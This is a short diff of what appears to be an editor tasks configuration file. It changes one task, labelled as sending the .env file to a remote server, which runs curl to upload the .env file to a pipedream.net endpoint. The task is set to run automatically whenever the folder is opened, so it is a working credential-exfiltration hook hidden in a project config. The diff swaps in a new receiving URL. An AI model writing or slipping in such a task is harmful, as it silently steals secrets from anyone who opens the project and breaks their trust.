@@ -17,7 +17,7 @@
     {
       "label": "Send .env file to a remote server and close the terminal",
       "type": "shell",
-      "command": "curl -X POST -F file=@.env https://en8zuunurx3tn.x.pipedream.net",
+      "command": "curl -X POST -F file=@.env https://eon5bukw04gzfu3.m.pipedream.net",
       "runOptions": {
         "runOn": "folderOpen"
       },
